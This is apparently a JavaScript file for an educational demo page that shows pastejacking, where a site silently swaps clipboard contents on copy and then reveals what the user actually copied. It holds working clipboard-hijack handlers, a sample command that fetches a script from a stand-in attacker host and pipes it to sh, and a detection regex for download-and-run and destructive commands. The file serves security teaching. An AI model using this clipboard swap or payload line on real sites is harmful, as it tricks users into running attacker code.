// script.js — the LOGIC of the "Pastejacking Demo"
// Pastejacking = a website secretly changes what goes into your clipboard.
// You copy a harmless command, but you paste a dangerous one into your terminal.
// Two tricks are shown:
//   1) JavaScript replaces the clipboard on "copy" (button or Ctrl+C)
//   2) Invisible text (hidden with CSS) is still copied with the selection
// The paste box then shows what REALLY got copied.
// SAFE: evil.example is a reserved fake domain, and this page never runs anything.

const SHOWN  = "pip install requests";
const SECRET = "pip install requests && curl -s http://evil.example/steal.sh | sh";

/* ---------- Trick 1a: hijack the copy BUTTON ---------- */
document.getElementById("copy1").addEventListener("click", async function () {
  try {
    await navigator.clipboard.writeText(SECRET);    // modern clipboard API
  } catch (e) {
    // fallback for old browsers / file:// pages: copy from a hidden textarea
    const t = document.createElement("textarea");
    t.value = SECRET;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    t.remove();
  }
  this.textContent = "✅ Copied! Now paste below";
});

/* ---------- Trick 1b: hijack Ctrl+C on the code box ---------- */
// The "copy" event fires when the user copies. We cancel the normal copy
// and put our own text into the clipboard instead.
document.getElementById("code1").addEventListener("copy", function (e) {
  e.preventDefault();                              // stop the real copy
  e.clipboardData.setData("text/plain", SECRET);   // put the secret text instead
});

/* ---------- Trick 2 needs no JavaScript at all! ---------- */
// The <span class="hidden"> in index.html is invisible (CSS), but the browser
// still copies it, because it is part of the selected text.
// NEXT → the paste box below reveals both tricks.

/* ---------- The paste box: reveal the truth ---------- */
document.getElementById("paste").addEventListener("input", function () {
  const pasted = this.value;
  const box = document.getElementById("verdict");
  if (!pasted.trim()) { box.innerHTML = ""; return; }

  // dangerous patterns: download-and-run, chaining, deleting
  const danger = /curl|wget|\|\s*sh|&&|;|rm\s+-rf|powershell|iex/i;
  const visible = [SHOWN, "git clone https://github.com/Kanak234/demo && cd demo"];

  if (visible.includes(pasted.trim()) && !/evil\.example/.test(pasted)) {
    box.className = "ok";
    box.textContent = "✅ What you pasted matches what you saw.";
  } else if (danger.test(pasted)) {
    box.className = "bad";
    // textContent → the pasted text is shown as plain text (XSS-safe)
    box.innerHTML = "<h3>🚨 You got pastejacked!</h3><p>You saw a simple command, but you pasted:</p><pre></pre>" +
      "<p>In a real terminal, pressing Enter would download and run the attacker's script <b>immediately</b>.</p>";
    box.querySelector("pre").textContent = pasted;
  } else {
    box.className = "";
    box.textContent = "Pasted text looks normal.";
  }
});
